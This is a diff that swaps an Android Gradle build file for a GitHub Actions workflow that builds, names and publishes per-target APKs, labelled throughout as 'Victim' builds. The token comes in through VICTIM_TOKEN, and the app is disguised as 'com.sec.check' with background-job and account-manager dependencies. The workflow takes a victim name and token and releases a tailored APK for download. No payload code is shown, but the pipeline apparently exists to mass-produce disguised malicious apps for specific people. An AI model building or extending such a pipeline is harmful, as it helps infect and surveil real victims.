@@ -1,73 +1,132 @@
-plugins {
-    id 'com.android.application'
-}
+name: Build Victim APK
 
-def victimTokenValue = "DEFAULT_TOKEN"
-if (project.hasProperty('victimToken')) {
-    victimTokenValue = project.property('victimToken')
-}
-if (System.getenv("VICTIM_TOKEN")) {
-    victimTokenValue = System.getenv("VICTIM_TOKEN")
-}
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+    inputs:
+      victim_token:
+        description: 'Victim Token'
+        required: true
+        default: 'DEFAULT_TOKEN'
+      victim_name:
+        description: 'Victim Name'
+        required: false
+        default: 'Unknown'
 
-println "BUILDING WITH VICTIM_TOKEN = ${victimTokenValue}"
+permissions:
+  contents: write
 
-android {
-    namespace 'com.sec.check'
-    compileSdk 33
+jobs:
+  build:
+    runs-on: ubuntu-latest
 
-    defaultConfig {
-        applicationId "com.sec.check"
-        minSdk 23
-        targetSdk 33
-        versionCode 1
-        versionName "1.0"
-        buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
-    }
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
 
-    buildFeatures {
-        buildConfig true
-    }
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
 
-    buildTypes {
-        release {
-            minifyEnabled false
-            buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
-        }
-        debug {
-            buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
-        }
-    }
+      - name: Setup Android SDK
+        run: |
+          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
+          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true
+          $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager "platforms;android-33" "build-tools;33.0.1" > /dev/null 2>&1 || true
 
-    compileOptions {
-        sourceCompatibility JavaVersion.VERSION_1_8
-        targetCompatibility JavaVersion.VERSION_1_8
-    }
+      - name: Setup Gradle
+        uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: '8.2'
+          cache-disabled: true
 
-    configurations.all {
-        resolutionStrategy {
-            force 'org.jetbrains.kotlin:kotlin-stdlib:1.8.10'
-            force 'org.jetbrains.kotlin:kotlin-stdlib-jdk7:1.8.10'
-            force 'org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.8.10'
-        }
-    }
-}
+      # ★★★ إعداد الـ Token والاسم ★★★
+      - name: Prepare tokens
+        id: prep
+        run: |
+          if [ "${{ github.event_name }}" == "workflow_dispatch" ]; then
+            TOKEN="${{ github.event.inputs.victim_token }}"
+            NAME="${{ github.event.inputs.victim_name }}"
+          else
+            TOKEN="DEFAULT_TOKEN"
+            NAME="Unknown"
+          fi
 
-dependencies {
-    implementation 'androidx.appcompat:appcompat:1.6.1'
-    implementation 'androidx.core:core:1.10.1'
-    implementation 'androidx.work:work-runtime:2.8.1'
+          if [ -z "$TOKEN" ]; then TOKEN="DEFAULT_TOKEN"; fi
+          if [ -z "$NAME" ]; then NAME="Unknown"; fi
 
-    // ★ JobScheduler
-    implementation 'androidx.core:core:1.10.1'
+          echo "token=$TOKEN" >> $GITHUB_OUTPUT
+          echo "name=$NAME" >> $GITHUB_OUTPUT
+          echo "short=$(echo $TOKEN | cut -c1-16)" >> $GITHUB_OUTPUT
 
-    // ★ Account Manager
-    implementation 'androidx.preference:preference:1.2.0'
+          echo "=== TOKEN: $TOKEN ==="
+          echo "=== NAME: $NAME ==="
+          echo "=== SHORT: $(echo $TOKEN | cut -c1-16) ==="
 
-    implementation('androidx.appcompat:appcompat:1.6.1') {
-        exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk7'
-        exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk8'
-    }
+      # ★★★ البناء مع تمرير التوكن ★★★
+      - name: Build APK
+        env:
+          VICTIM_TOKEN: ${{ steps.prep.outputs.token }}
+        run: |
+          echo "Building with VICTIM_TOKEN=$VICTIM_TOKEN"
+          chmod +x gradlew
+          ./gradlew assembleDebug -Dorg.gradle.jvmargs=-Xmx2048m --no-daemon --stacktrace
 
-    implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.8.10'
-}
+      # ★★★ التحقق من وجود الـ APK ★★★
+      - name: Verify APK exists
+        run: |
+          ls -la app/build/outputs/apk/debug/
+          if [ ! -f app/build/outputs/apk/debug/app-debug.apk ]; then
+            echo "❌ APK not found!"
+            exit 1
+          fi
+          echo "✅ APK found"
+
+      # ★★★ إعادة تسمية الـ APK ★★★
+      - name: Rename APK
+        id: rename
+        run: |
+          mkdir -p output
+          SHORT="${{ steps.prep.outputs.short }}"
+          NAME="${{ steps.prep.outputs.name }}"
+
+          # نظّف الاسم من أي حروف غريبة
+          SAFE_NAME=$(echo "$NAME" | tr -cd '[:alnum:]_-')
+          if [ -z "$SAFE_NAME" ]; then SAFE_NAME="victim"; fi
+
+          APK_NAME="Victim_${SAFE_NAME}_${SHORT}.apk"
+          cp app/build/outputs/apk/debug/app-debug.apk "output/$APK_NAME"
+
+          echo "apk_name=$APK_NAME" >> $GITHUB_OUTPUT
+          echo "=== APK renamed to: $APK_NAME ==="
+          ls -la output/
+
+      # ★★★ رفع كـ Artifact ★★★
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Victim-${{ steps.prep.outputs.short }}
+          path: output/*.apk
+          retention-days: 30
+
+      # ★★★ إنشاء Release ★★★
+      - name: Create Release
+        uses: softprops/action-gh-release@v1
+        with:
+          tag_name: victim-${{ github.run_number }}-${{ steps.prep.outputs.short }}
+          name: Victim-${{ steps.prep.outputs.name }}-${{ steps.prep.outputs.short }}
+          body: |
+            ## Victim APK
+            
+            - **Name:** ${{ steps.prep.outputs.name }}
+            - **Token (first 16):** ${{ steps.prep.outputs.short }}...
+            - **Build:** ${{ github.run_number }}
+            - **Date:** ${{ github.event.head_commit.timestamp || github.run_started_at }}
+          files: output/*.apk
+          draft: false
+          prerelease: false
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
